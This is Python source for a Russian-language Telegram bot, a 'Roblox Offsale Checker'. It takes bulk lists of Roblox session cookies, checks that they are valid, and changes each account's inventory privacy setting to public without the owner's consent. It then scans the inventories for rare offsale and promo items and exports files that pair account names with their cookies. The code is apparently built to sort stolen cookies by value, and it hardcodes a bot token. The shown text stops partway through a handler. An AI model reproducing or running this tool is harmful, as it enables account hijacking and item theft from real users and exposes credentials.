import asyncio
import io
import re
import aiohttp
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions,
    BufferedInputFile
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = "8035442503:AAG-gdNAKMFhnyyaHGfjeMdh48-sa-Jd55A"
ADMIN_IDS = {5883796026, 115536598}

YEAR_FROM   = 2012
YEAR_TO     = 2024
CHECK_PROMO = True

ASSET_TYPES = {
    "faces":    True,
    "hats":     True,
    "hair":     True,
    "neck":     True,
    "shoulder": True,
    "front":    True,
    "back":     True,
    "waist":    True,
    "gear":     True,
    "clothing": False,
}
# ================================

ASSET_TYPE_STRINGS = {
    "faces":    ["Face"],
    "hats":     ["Hat"],
    "hair":     ["HairAccessory"],
    "neck":     ["FaceAccessory"],
    "shoulder": ["ShoulderAccessory"],
    "front":    ["FrontAccessory"],
    "back":     ["BackAccessory"],
    "waist":    ["WaistAccessory"],
    "gear":     ["Gear"],
    "clothing": ["Shirt", "Pants"],
}

ASSET_LABELS = {
    "faces":    "👤 Лица",
    "hats":     "🎩 Шапки",
    "hair":     "💇 Волосы",
    "neck":     "📿 Шея",
    "shoulder": "🦴 Плечи",
    "front":    "🧣 Передние",
    "back":     "🎒 Задние",
    "waist":    "🩱 Пояс",
    "gear":     "⚔️ Снаряжение",
    "clothing": "👕 Одежда",
}

CODE_ITEMS = {
    189934238:  "Fireman",
    4342314393: "Rainbow Squid Unicorn",
    263405835:  "Chicken Headrow",
    263405839:  "Black Iron Tentacles",
    263405842:  "Code Review Specs",
    263405844:  "Stickpack",
    263405846:  "Shark Fin",
    263405849:  "Federation Necklace",
    263405851:  "Backup Mr. Robot",
    263405853:  "Dark Lord of SQL",
    263405855:  "Roblox visor 1",
    263405857:  "Silver Bow Tie",
    263405859:  "Dodgeball Helmet",
    263405861:  "Shoulder Raccoon",
    263405863:  "Dued1",
    263405865:  "Pauldrons",
    263405867:  "Octember Encore",
    263405869:  "Umberhorns",
    128540404:  "Police Cap",
    128540406:  "American Baseball Cap",
    128540408:  "Orange Cap",
    218491492:  "Navy Queen otn",
    128540410:  "Zombie Knit",
    128540412:  "Epic Miners Headlamp",
    128540414:  "Beast Mode Bandana",
    162295698:  "Golden Reingment",
    128540416:  "Beast Scythe",
    128540418:  "Hare Hoodie",
    128540420:  "Diamond Tiara",
    128540422:  "Callmehbob",
    128540424:  "Sword Cane",
    128540426:  "Selfie Stick",
    128540428:  "Phantom Forces Combat Knife",
    128540430:  "Golden Horns",
    128540432:  "The Soup is Dry",
    128540434:  "Monster Grumpy Face",
    128540436:  "Elegant Evening Face",
    128540438:  "Super Pink Make-Up",
    128540440:  "Cyanskeleface",
    128540442:  "Pizza Face",
    128540444:  "Bakonetta",
    128540446:  "Isabella",
    128540448:  "Mon Cheri",
    128540450:  "Rogueish Good Looks",
    128540452:  "Mixologist's Smile",
    128540454:  "BiteyMcFace",
    128540456:  "Performing Mime",
    128540458:  "Rainbow Spirit Face",
    128540460:  "Mermaid Mystique",
    128540462:  "Starry Eyes Sparkling",
    128540464:  "Sparkling Friendly Wink",
    128540466:  "Kandi's Sprinkle Face",
    128540468:  "Tears of Sorrow",
    128540470:  "Fashion Face",
    128540472:  "Princess Alexis",
    128540474:  "Otakufaic",
    128540476:  "Pop Queen",
    128540478:  "Assassin Face",
    128540480:  "Sapphire Gaze",
    128540482:  "Persephone's E-Girl",
    128540484:  "Arachnid Queen",
    128540486:  "Rainbow Barf Face",
    128540488:  "Star Sorority",
    128540490:  "Tsundere Face",
    128540492:  "Winning Smile",
}

# ================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp  = Dispatcher(storage=MemoryStorage())

settings = {
    "year_from":   YEAR_FROM,
    "year_to":     YEAR_TO,
    "check_promo": CHECK_PROMO,
    "asset_types": dict(ASSET_TYPES),
}

class SetYear(StatesGroup):
    from_year = State()
    to_year   = State()

class SearchState(StatesGroup):
    waiting_for_term   = State()
    waiting_for_cookie = State()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
CHECK_SEM = asyncio.Semaphore(5)


# ========== HELPERS ==========

def _parse_one_cookie(raw):
    """Извлекает чистый кук из строки любого формата."""
    c = raw.strip()
    # Формат с метаданными: "... | Cookie: VALUE"
    if "Cookie: " in c:
        c = c.split("Cookie: ")[-1].strip()
    # Убираем WARNING заголовок Roblox
    # Новый формат:  _|WARNING:-...|_ACTUALCOOKIE
    if c.startswith("_|WARNING") and "|_" in c:
        c = c.split("|_", 1)[-1].strip()
    # Старый формат: _|WARNING:-...--|ACTUALCOOKIE
    elif "_|WARNING" in c and "--|" in c:
        c = c.split("--|", 1)[-1].strip()
    # Убираем префикс имени куки если есть
    for p in [".ROBLOSECURITY=", "ROBLOSECURITY="]:
        if c.lower().startswith(p.lower()):
            c = c[len(p):]
    return c.strip()


def clean_cookie(raw):
    return _parse_one_cookie(raw)


def _is_roblox_cookie(val):
    """Проверяет что строка это реальный кук Roblox, а не мусор из метаданных."""
    if len(val) < 50:
        return False
    # Куки не содержат пробелов
    if " " in val:
        return False
    # Типичные слова из метаданных — не куки
    for bad in ["Username", "Cookie", "WARNING", "http", "Birthdate",
                "Country", "Robux", "Email", "Playtime", "Gamepass",
                "Badge", "Sessions", "Followers", "roblox.com"]:
        if bad in val:
            return False
    # Roblox куки — base64url строки, допустимые символы:
    import re as _re
    if not _re.match(r'^[A-Za-z0-9\-_=+/.%]+$', val):
        return False
    return True


def extract_cookies(text):
    """Извлекает все куки из текста любого формата. Строго фильтрует мусор."""
    cookies = []
    seen    = set()
    lines   = re.split(r"\r?\n", text)

    for line in lines:
        line = line.strip()
        if not line:
            continue

        # Строки с явным маркером Cookie: — берём только значение после него
        if "Cookie: " in line:
            raw = line.split("Cookie: ")[-1].strip()
            val = _parse_one_cookie(raw)
            if _is_roblox_cookie(val) and val not in seen:
                seen.add(val)
                cookies.append(val)
            continue

        # Голые строки — пробуем весь кук
        val = _parse_one_cookie(line)
        if _is_roblox_cookie(val) and val not in seen:
            seen.add(val)
            cookies.append(val)

    return cookies


def rbx_h(cookie):
    return {
        "Cookie":          ".ROBLOSECURITY=" + cookie,
        "User-Agent":      UA,
        "Accept":          "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer":         "https://www.roblox.com/",
        "Origin":          "https://www.roblox.com",
    }


def new_s():
    return aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False),
        timeout=aiohttp.ClientTimeout(total=30)
    )


# ========== AUTH ==========

async def get_user_info(cookie):
    async with new_s() as s:
        try:
            async with s.get(
                "https://users.roblox.com/v1/users/authenticated",
                headers=rbx_h(cookie)
            ) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    if d.get("id"):
                        return {"id": int(d["id"]), "name": d.get("displayName") or d.get("name") or "?"}
        except Exception:
            pass
        try:
            async with s.get(
                "https://www.roblox.com/mobileapi/userinfo",
                headers=rbx_h(cookie)
            ) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    if d.get("UserID"):
                        return {"id": int(d["UserID"]), "name": d.get("UserName") or "?"}
        except Exception:
            pass
    return None


# ========== CSRF + OPEN INVENTORY ==========

async def get_csrf(cookie):
    async with new_s() as s:
        for url in [
            "https://auth.roblox.com/v2/logout",
            "https://accountsettings.roblox.com/v1/email",
        ]:
            try:
                async with s.post(url, headers=rbx_h(cookie)) as r:
                    token = r.headers.get("x-csrf-token")
                    if token:
                        return token
            except Exception:
                pass
    return None


async def open_inventory(cookie):
    """Открывает инвентарь. Возвращает True если успешно."""
    csrf = await get_csrf(cookie)
    if not csrf:
        return False
    hdrs = dict(rbx_h(cookie))
    hdrs["x-csrf-token"] = csrf
    hdrs["Content-Type"] = "application/json"
    attempts = [
        ("POST",  "https://accountsettings.roblox.com/v1/privacy/inventory-privacy", {"inventoryPrivacy": 1}),
        ("PATCH", "https://accountsettings.roblox.com/v1/privacy/inventory-privacy", {"inventoryPrivacy": 1}),
        ("POST",  "https://accountsettings.roblox.com/v1/privacy", {"InventoryPrivacySetting": "AllUsers"}),
        ("PATCH", "https://accountsettings.roblox.com/v1/privacy", {"InventoryPrivacySetting": "AllUsers"}),
    ]
    async with new_s() as s:
        for method, url, body in attempts:
            try:
                fn = s.post if method == "POST" else s.patch
                async with fn(url, json=body, headers=hdrs) as r:
                    if r.status in (200, 204):
                        return True
            except Exception:
                pass
    return False


# ========== FETCH INVENTORY ==========

async def fetch_inventory(cookie, user_id):
    """
    Загружает ВСЕ предметы инвентаря.
    Если инвентарь закрыт (403) — открывает и повторяет.
    Возвращает список asset_id (стабильный — всегда sorted).
    """
    type_strings = []
    for key, on in settings["asset_types"].items():
        if on:
            type_strings.extend(ASSET_TYPE_STRINGS[key])

    all_ids = set()
    need_reopen = False

    async with new_s() as s:
        for type_str in type_strings:
            cursor = ""
            page   = 0
            while True:
                page += 1
                params = {"assetTypes": type_str, "limit": 100, "sortOrder": "Asc"}
                if cursor:
                    params["cursor"] = cursor
                try:
                    async with s.get(
                        "https://inventory.roblox.com/v2/users/{}/inventory".format(user_id),
                        params=params,
                        headers=rbx_h(cookie)
                    ) as r:
                        if r.status == 403:
                            need_reopen = True
                            break
                        if r.status != 200:
                            break
                        data = await r.json(content_type=None)
                        for item in data.get("data", []):
                            aid = item.get("assetId") or item.get("id")
                            if aid:
                                all_ids.add(int(aid))
                        cursor = data.get("nextPageCursor") or ""
                        if not cursor:
                            break
                except Exception:
                    break
                await asyncio.sleep(0.2)

    # Если инвентарь закрыт — открываем и грузим заново
    if need_reopen or not all_ids:
        opened = await open_inventory(cookie)
        if opened:
            await asyncio.sleep(2)
            async with new_s() as s:
                for type_str in type_strings:
                    cursor = ""
                    while True:
                        params = {"assetTypes": type_str, "limit": 100, "sortOrder": "Asc"}
                        if cursor:
                            params["cursor"] = cursor
                        try:
                            async with s.get(
                                "https://inventory.roblox.com/v2/users/{}/inventory".format(user_id),
                                params=params,
                                headers=rbx_h(cookie)
                            ) as r:
                                if r.status != 200:
                                    break
                                data = await r.json(content_type=None)
                                for item in data.get("data", []):
                                    aid = item.get("assetId") or item.get("id")
                                    if aid:
                                        all_ids.add(int(aid))
                                cursor = data.get("nextPageCursor") or ""
                                if not cursor:
                                    break
                        except Exception:
                            break
                        await asyncio.sleep(0.2)

    # ВАЖНО: возвращаем отсортированный список — результат всегда одинаковый
    return sorted(all_ids)


# ========== ASSET DETAILS ==========

async def get_details(cookie, asset_id):
    async with new_s() as s:
        try:
            async with s.get(
                "https://economy.roblox.com/v2/assets/{}/details".format(asset_id),
                headers=rbx_h(cookie)
            ) as r:
                if r.status == 200:
                    return await r.json(content_type=None)
        except Exception:
            pass
    return None


async def check_owns(cookie, user_id, asset_id):
    async with new_s() as s:
        try:
            async with s.get(
                "https://inventory.roblox.com/v1/users/{}/items/Asset/{}".format(user_id, asset_id),
                headers=rbx_h(cookie)
            ) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    return bool(d.get("data"))
        except Exception:
            pass
    return False


# ========== MAIN CHECK ==========

async def check_account(cookie, status_cb, mode="offsale", search_term=None):
    """
    status_cb(text) — функция для обновления статуса.
    mode = "offsale" | "search"
    """
    result = {
        "valid":          False,
        "user_id":        None,
        "username":       None,
        "offsale":        [],
        "promo_found":    [],
        "inv_total":      0,
        "search_results": [],
    }

    # 1. Авторизация
    user_info = await get_user_info(cookie)
    if not user_info:
        return result

    result["valid"]    = True
    result["user_id"]  = user_info["id"]
    result["username"] = user_info["name"]
    uid   = user_info["id"]
    uname = user_info["name"]

    # 2. Загружаем инвентарь (открывает автоматически если закрыт)
    await status_cb("✅ <b>{}</b>\n📦 Загружаю инвентарь...".format(uname))
    all_ids = await fetch_inventory(cookie, uid)
    result["inv_total"] = len(all_ids)

    if not all_ids:
        return result

    # ── Режим поиска ──────────────────────────────────────────────
    if mode == "search" and search_term:
        term_lower = search_term.lower()
        await status_cb("✅ <b>{}</b>\n🔍 Ищу «{}» в {} предметах...".format(
            uname, search_term, len(all_ids)))
        total = len(all_ids)
        for i, asset_id in enumerate(all_ids):
            if i % 50 == 0:
                await status_cb("✅ <b>{}</b>\n🔍 Ищу «{}»: {}/{}...".format(
                    uname, search_term, i, total))
            det = await get_details(cookie, asset_id)
            if not det:
                await asyncio.sleep(0.1)
                continue
            name = det.get("Name", "")
            if term_lower in name.lower():
                year = 0
                try:
                    created = det.get("Created", "")
                    if created:
                        dt   = datetime.fromisoformat(created.replace("Z", "+00:00"))
                        year = dt.year
                except Exception:
                    pass
                result["search_results"].append({"id": asset_id, "name": name, "year": year})
            await asyncio.sleep(0.1)
        return result

    # ── Режим оффсейл ─────────────────────────────────────────────

    # Промо
    if settings["check_promo"]:
        promo_keys = list(CODE_ITEMS.keys())
        total_p    = len(promo_keys)
        await status_cb("✅ <b>{}</b>\n🎁 Промо 0/{}...".format(uname, total_p))
        for i, asset_id in enumerate(promo_keys):
            if i % 10 == 0:
                await status_cb("✅ <b>{}</b>\n🎁 Промо {}/{}...".format(uname, i, total_p))
            if await check_owns(cookie, uid, asset_id):
                result["promo_found"].append({"id": asset_id, "name": CODE_ITEMS[asset_id]})
            await asyncio.sleep(0.2)

    # Оффсейл
    total = len(all_ids)
    await status_cb("✅ <b>{}</b>\n🔍 Проверяю {} предметов...".format(uname, total))
    for i, asset_id in enumerate(all_ids):
        if i % 30 == 0:
            await status_cb("✅ <b>{}</b>\n🔍 {}/{}...".format(uname, i, total))
        det = await get_details(cookie, asset_id)
        if not det:
            await asyncio.sleep(0.1)
            continue
        if det.get("IsForSale", True):
            await asyncio.sleep(0.1)
            continue
        year = 0
        try:
            created = det.get("Created", "")
            if created:
                dt   = datetime.fromisoformat(created.replace("Z", "+00:00"))
                year = dt.year
        except Exception:
            pass
        if year and not (settings["year_from"] <= year <= settings["year_to"]):
            await asyncio.sleep(0.1)
            continue
        is_unique  = det.get("IsLimitedUnique", False)
        is_limited = det.get("IsLimited", False) or is_unique
        name       = det.get("Name") or "ID:{}".format(asset_id)
        result["offsale"].append({
            "id": asset_id, "name": name,
            "year": year, "limited": is_limited, "unique": is_unique,
        })
        await asyncio.sleep(0.1)

    return result


# ========== SILENT CHECK ==========

class _FakeStatus:
    async def __call__(self, text):
        pass


async def _silent_check(cookie, mode="offsale", search_term=None):
    empty = {
        "valid": False, "user_id": None, "username": None,
        "offsale": [], "promo_found": [], "inv_total": 0, "search_results": [],
    }
    try:
        return await check_account(cookie, _FakeStatus(), mode=mode, search_term=search_term)
    except Exception:
        return empty


# ========== REPORT BUILDER ==========

def build_report(result):
    uid, uname = result["user_id"], result["username"]
    offsale    = result["offsale"]
    promo      = result["promo_found"]
    lines = [
        "📋 <b>Отчёт проверки</b>",
        '👤 <a href="https://www.roblox.com/users/{}/profile">{}</a>  (ID: {})'.format(uid, uname, uid),
        "📅 Период: <b>{} – {}</b>".format(settings["year_from"], settings["year_to"]),
        "📦 Предметов: <b>{}</b>".format(result.get("inv_total", 0)),
        "",
    ]
    if offsale:
        lines.append("🛑 <b>Оффсейл — {} шт.:</b>".format(len(offsale)))
        by_year = {}
        for it in sorted(offsale, key=lambda x: x["year"] or 9999):
            by_year.setdefault(it["year"] or 0, []).append(it)
        for year in sorted(by_year):
            lines.append("\n  📆 <b>{}:</b>".format(year or "Год неизвестен"))
            for it in by_year[year]:
                badge = " 🔴LimitedU" if it["unique"] else (" 🟡Limited" if it["limited"] else "")
                lines.append('    • <a href="https://www.roblox.com/catalog/{}">{}</a>{}'.format(
                    it["id"], it["name"], badge))
    else:
        lines.append("🛑 Оффсейл предметов <b>не найдено</b>")
    lines.append("")
    if settings["check_promo"]:
        if promo:
            lines.append("🎁 <b>Промо — {} шт.:</b>".format(len(promo)))
            for it in promo:
                lines.append('    • <a href="https://www.roblox.com/catalog/{}">{}</a>'.format(
                    it["id"], it["name"]))
        else:
            lines.append("🎁 Промо-предметов <b>не найдено</b>")
    return "\n".join(lines)


# ========== SINGLE CHECK ==========

async def run_check(message, cookie, show_debug=False):
    cookie = clean_cookie(cookie)
    if len(cookie) < 50:
        await message.answer("❌ Cookie слишком короткий.")
        return

    status_msg = await message.answer("⏳ <b>Авторизация...</b>")

    async def upd(text):
        try:
            await status_msg.edit_text(text)
        except Exception:
            pass

    async with CHECK_SEM:
        try:
            result = await check_account(cookie, upd)
        except Exception as e:
            await status_msg.edit_text("❌ Ошибка:\n<code>{}</code>".format(e))
            return

    if not result["valid"]:
        await status_msg.edit_text("❌ <b>Невалидный cookie</b>")
        return

    report = build_report(result)
    if len(report) > 3800:
        await status_msg.delete()
        f = BufferedInputFile(report.encode("utf-8"), filename="report_{}.txt".format(result["user_id"]))
        await message.answer_document(f, caption="📋 {}".format(result["username"]))
    else:
        await status_msg.edit_text(report, link_preview_options=LinkPreviewOptions(is_disabled=True))


# ========== BATCH CHECK ==========

async def run_batch(message, cookies):
    total    = len(cookies)
    results  = [None] * total
    counter  = {"done": 0, "valid": 0, "invalid": 0}
    seen_ids = {}
    dupes    = 0

    prog_msg = await message.answer("⏳ Проверяю 0/{}...".format(total))
    sem      = asyncio.Semaphore(5)

    async def worker(i, c):
        nonlocal dupes
        async with sem:
            r = await _silent_check(c)
            results[i] = (r, c)
            counter["done"] += 1
            if r["valid"]:
                counter["valid"] += 1
                uid = r["user_id"]
                if uid in seen_ids:
                    dupes += 1
                else:
                    seen_ids[uid] = i
            else:
                counter["invalid"] += 1
            if counter["done"] % 5 == 0 or counter["done"] == total:
                try:
                    await prog_msg.edit_text(
                        "⏳ {}/{}... ✅{} ❌{}".format(
                            counter["done"], total,
                            counter["valid"], counter["invalid"]
                        )
                    )
                except Exception:
                    pass

    await asyncio.gather(*[worker(i, c) for i, c in enumerate(cookies)])
    try:
        await prog_msg.delete()
    except Exception:
        pass

    valid_pairs = [
        (r, c) for (r, c) in results
        if r and r["valid"] and r["user_id"] in seen_ids
    ]
    hits = [(r, c) for r, c in valid_pairs if r["offsale"] or r["promo_found"]]

    summary = (
        "📊 <b>Итоги проверки</b>\n\n"
        "🔢 Всего: <b>{}</b>\n"
        "✅ Валидных: <b>{}</b>\n"
        "❌ Невалидных: <b>{}</b>\n"
        "👥 Дубликатов: <b>{}</b>\n\n"
        "🛑 Акков с оффсейл: <b>{}</b>\n"
        "🎁 Акков с промо: <b>{}</b>"
    ).format(
        total, counter["valid"], counter["invalid"], dupes,
        sum(1 for r, _ in valid_pairs if r["offsale"]),
        sum(1 for r, _ in valid_pairs if r["promo_found"]),
    )
    await message.answer(summary)

    if hits:
        lines = ["АККАУНТЫ С НАХОДКАМИ", "=" * 60, ""]
        for r, c in hits:
            uid, uname = r["user_id"], r["username"]
            lines += [
                "=" * 60,
                "Аккаунт: {} (ID: {})".format(uname, uid),
                "Ссылка: https://www.roblox.com/users/{}/profile".format(uid),
                "Куки: {}".format(c),
                "",
            ]
            if r["offsale"]:
                lines.append("ОФФСЕЙЛ ({} шт.):".format(len(r["offsale"])))
                for it in sorted(r["offsale"], key=lambda x: x["year"] or 9999):
                    badge = " [LimitedU]" if it["unique"] else (" [Limited]" if it["limited"] else "")
                    lines.append("  {} ({}) — https://www.roblox.com/catalog/{}{}".format(
                        it["name"], it["year"] or "?", it["id"], badge))
            else:
                lines.append("Оффсейл: нет")
            lines.append("")
            if r["promo_found"]:
                lines.append("ПРОМО ({} шт.):".format(len(r["promo_found"])))
                for it in r["promo_found"]:
                    lines.append("  {} — https://www.roblox.com/catalog/{}".format(it["name"], it["id"]))
            else:
                lines.append("Промо: нет")
            lines.append("")

        f = BufferedInputFile(
            "\n".join(lines).encode("utf-8"),
            filename="hits_{}_accs.txt".format(len(hits))
        )
        await message.answer_document(
            f, caption="🎯 {} акков с находками из {}".format(len(hits), total)
        )
    else:
        await message.answer("😔 Ни на одном аккаунте ничего не найдено.")


# ========== BATCH SEARCH ==========

async def run_batch_search(message, cookies, search_term):
    total    = len(cookies)
    results  = [None] * total
    counter  = {"done": 0, "valid": 0, "invalid": 0}
    seen_ids = {}
    dupes    = 0
    start    = datetime.now()

    prog_msg = await message.answer(
        "🔍 Поиск «{}» по {} кукам... 0/{}".format(search_term, total, total)
    )
    sem = asyncio.Semaphore(5)

    async def worker(i, cookie):
        nonlocal dupes
        async with sem:
            r = await _silent_check(cookie, mode="search", search_term=search_term)
            results[i] = (r, cookie)
            counter["done"] += 1
            if r["valid"]:
                counter["valid"] += 1
                uid = r["user_id"]
                if uid in seen_ids:
                    dupes += 1
                else:
                    seen_ids[uid] = i
            else:
                counter["invalid"] += 1
            found_so_far = sum(
                len(x[0]["search_results"]) for x in results
                if x and x[0] and x[0].get("search_results")
            )
            if counter["done"] % 5 == 0 or counter["done"] == total:
                elapsed = (datetime.now() - start).total_seconds()
                speed   = counter["done"] / elapsed if elapsed > 0 else 0
                try:
                    await prog_msg.edit_text(
                        "🔍 «{}» — {}/{} | ✅{} ❌{} | 🎯{} | {:.1f}/с".format(
                            search_term, counter["done"], total,
                            counter["valid"], counter["invalid"],
                            found_so_far, speed
                        )
                    )
                except Exception:
                    pass

    await asyncio.gather(*[worker(i, c) for i, c in enumerate(cookies)])
    try:
        await prog_msg.delete()
    except Exception:
        pass

    valid_pairs = [
        (r, c) for (r, c) in results
        if r and r["valid"] and r["user_id"] in seen_ids
    ]
    hits        = [(r, c) for r, c in valid_pairs if r.get("search_results")]
    total_found = sum(len(r["search_results"]) for r, _ in hits)
    elapsed     = (datetime.now() - start).total_seconds()

    summary = (
        "✅ <b>Поиск завершён</b>\n\n"
        "🔍 Запрос: «<b>{}</b>»\n"
        "⏱ Время: {:.1f} с\n\n"
        "🔢 Всего куков: <b>{}</b>\n"
        "✅ Валидных: <b>{}</b>\n"
        "❌ Невалидных: <b>{}</b>\n"
        "👥 Дубликатов: <b>{}</b>\n\n"
        "🎯 Акков с находками: <b>{}</b>\n"
        "📦 Всего предметов: <b>{}</b>"
    ).format(
        search_term, elapsed,
        total, counter["valid"], counter["invalid"], dupes,
        len(hits), total_found
    )
    await message.answer(summary, link_preview_options=LinkPreviewOptions(is_disabled=True))

    if hits:
        lines = [
            "РЕЗУЛЬТАТЫ ПОИСКА: «{}»".format(search_term),
            "=" * 60,
            "Всего: {} | Валид: {} | Невалид: {} | Дубли: {}".format(
                total, counter["valid"], counter["invalid"], dupes),
            "Акков с находками: {} | Предметов: {}".format(len(hits), total_found),
            "Время: {:.1f} с".format(elapsed),
            "",
        ]
        for r, cookie in hits:
            uid, uname = r["user_id"], r["username"]
            found = r["search_results"]
            lines += [
                "=" * 60,
                "Аккаунт: {} (ID: {})".format(uname, uid),
                "Ссылка: https://www.roblox.com/users/{}/profile".format(uid),
                "Куки: {}".format(cookie),
                "",
                "Найдено «{}» ({} шт.):".format(search_term, len(found)),
            ]
            for item in found:
                lines.append("  • {} ({}) — https://www.roblox.com/catalog/{}".format(
                    item["name"], item["year"] or "?", item["id"]))
            lines.append("")

        f = BufferedInputFile(
            "\n".join(lines).encode("utf-8"),
            filename="search_{}.txt".format(search_term.replace(" ", "_"))
        )
        await message.answer_document(
            f,
            caption="🔍 «{}» на {} акках ({} шт.)".format(search_term, len(hits), total_found)
        )
    else:
        await message.answer("❌ «{}» не найдено ни на одном аккаунте.".format(search_term))


# ========== КЛАВИАТУРА ==========

def settings_kb():
    rows = []
    for key, label in ASSET_LABELS.items():
        icon = "✅" if settings["asset_types"][key] else "❌"
        rows.append([InlineKeyboardButton(
            text="{} {}".format(icon, label),
            callback_data="tog_{}".format(key)
        )])
    pi = "✅" if settings["check_promo"] else "❌"
    rows.append([InlineKeyboardButton(text="{} 🎁 Промо".format(pi), callback_data="tog_promo")])
    rows.append([
        InlineKeyboardButton(text="📅 С {}".format(settings["year_from"]), callback_data="set_yf"),
        InlineKeyboardButton(text="📅 По {}".format(settings["year_to"]),  callback_data="set_yt"),
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def is_admin(obj):
    return obj.from_user.id in ADMIN_IDS


# ========== ХЕНДЛЕРЫ ==========

@dp.message(CommandStart())
async def cmd_start(message: Message):
    if not is_admin(message): return
    await message.answer(
        "🎮 <b>Roblox Offsale Checker</b>\n\n"
        "Отправь cookie текстом или .txt файлом\n\n"
        "⚙️ /settings — настройки\n"
        "ℹ️ /info — текущие настройки\n"
        "🛠 /debug [cookie] — проверка с логом\n"
        "🔍 /search [название] — поиск предмета по кукам"
    )


@dp.message(Command("info"))
async def cmd_info(message: Message):
    if not is_admin(message): return
    types_on = [ASSET_LABELS[k] for k, v in settings["asset_types"].items() if v]
    await message.answer(
        "ℹ️ <b>Настройки</b>\n📅 {}-{}\n🎁 Промо: {}\n📦 {}".format(
            settings["year_from"], settings["year_to"],
            "✅" if settings["check_promo"] else "❌",
            ", ".join(types_on)
        )
    )


@dp.message(Command("settings"))
async def cmd_settings(message: Message):
    if not is_admin(message): return
    await message.answer("⚙️ <b>Настройки</b>", reply_markup=settings_kb())


@dp.message(Command("debug"))
async def cmd_debug(message: Message):
    if not is_admin(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or len(clean_cookie(parts[1])) < 50:
        await message.answer("Использование: /debug [cookie]")
        return
    await run_check(message, parts[1].strip())


@dp.message(Command("search"))
async def cmd_search(message: Message, state: FSMContext):
    if not is_admin(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        await message.answer("🔍 Введи название предмета для поиска:")
        await state.set_state(SearchState.waiting_for_term)
        return
    term = parts[1].strip()
    await state.update_data(search_term=term)
    await message.answer(
        "🔍 Ищем «<b>{}</b>»\n\nОтправь куки текстом или .txt файлом:".format(term)
    )
    await state.set_state(SearchState.waiting_for_cookie)


@dp.message(SearchState.waiting_for_term)
async def process_search_term(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear()
        return
    term = message.text.strip()
    if not term:
        await message.answer("❌ Введи название.")
        return
    await state.update_data(search_term=term)
    await message.answer(
        "🔍 Ищем «<b>{}</b>»\n\nОтправь куки текстом или .txt файлом:".format(term)
    )
    await state.set_state(SearchState.waiting_for_cookie)


async def _do_search(message, cookies, term):
    """Единая точка запуска поиска."""
    if not cookies:
        await message.answer("❌ Не найдено куков.")
        return
    await message.answer("🔍 Найдено <b>{}</b> куков. Запускаю поиск «{}»...".format(len(cookies), term))
    if len(cookies) == 1:
        status_msg = await message.answer("⏳ Авторизация...")
        async def upd(text):
            try: await status_msg.edit_text(text)
            except Exception: pass
        async with CHECK_SEM:
            r = await check_account(cookies[0], upd, mode="search", search_term=term)
        if not r["valid"]:
            await status_msg.edit_text("❌ Невалидный cookie")
            return
        found = r["search_results"]
        if found:
            lines = ["🔍 <b>«{}»</b> на <b>{}</b>:\n".format(term, r["username"])]
            for it in found:
                lines.append('• <a href="https://www.roblox.com/catalog/{}">{}</a> ({})'.format(
                    it["id"], it["name"], it["year"] or "?"))
            await status_msg.edit_text(
                "\n".join(lines),
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )
        else:
            await status_msg.edit_text(
                "❌ На аккаунте {} не найдено «{}».".format(r["username"], term)
            )
    else:
        await run_batch_search(message, cookies, term)


@dp.message(SearchState.waiting_for_cookie, F.document)
async def handle_search_file(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear()
        return
    data = await state.get_data()
    term = data.get("search_term", "")
    doc  = message.document
    if not doc.file_name.endswith(".txt"):
        await message.answer("❌ Нужен .txt файл")
        return
    file = await bot.get_file(doc.file_id)
    buf  = io.BytesIO()
    await bot.download_file(file.file_path, destination=buf)
    buf.seek(0)
    cookies = extract_cookies(buf.read().decode("utf-8", errors="ignore"))
    await state.clear()
    await _do_search(message, cookies, term)


@dp.message(SearchState.waiting_for_cookie, F.text)
async def handle_search_text(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear()
        return
    data    = await state.get_data()
    term    = data.get("search_term", "")
    cookies = extract_cookies(message.text)
    await state.clear()
    await _do_search(message, cookies, term)


@dp.callback_query(F.data.startswith("tog_"))
async def cb_toggle(cb: CallbackQuery):
    if not is_admin(cb): return await cb.answer("⛔")
    key = cb.data.replace("tog_", "")
    if key == "promo":
        settings["check_promo"] = not settings["check_promo"]
    elif key in settings["asset_types"]:
        settings["asset_types"][key] = not settings["asset_types"][key]
    await cb.message.edit_reply_markup(reply_markup=settings_kb())
    await cb.answer("✅")


@dp.callback_query(F.data == "set_yf")
async def cb_yf(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer("📅 Начальный год (сейчас {}):".format(settings["year_from"]))
    await state.set_state(SetYear.from_year)
    await cb.answer()


@dp.callback_query(F.data == "set_yt")
async def cb_yt(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer("📅 Конечный год (сейчас {}):".format(settings["year_to"]))
    await state.set_state(SetYear.to_year)
    await cb.answer()


@dp.message(SetYear.from_year)
async def save_yf(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear()
        return
    try:
        y = int(message.text.strip())
        assert 2006 <= y <= 2030
        settings["year_from"] = y
        await message.answer("✅ Начальный год: <b>{}</b>".format(y))
        await state.clear()
    except (ValueError, AssertionError):
        await message.answer("❌ Введи число 2006–2030")


@dp.message(SetYear.to_year)
async def save_yt(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear()
        return
    try:
        y = int(message.text.strip())
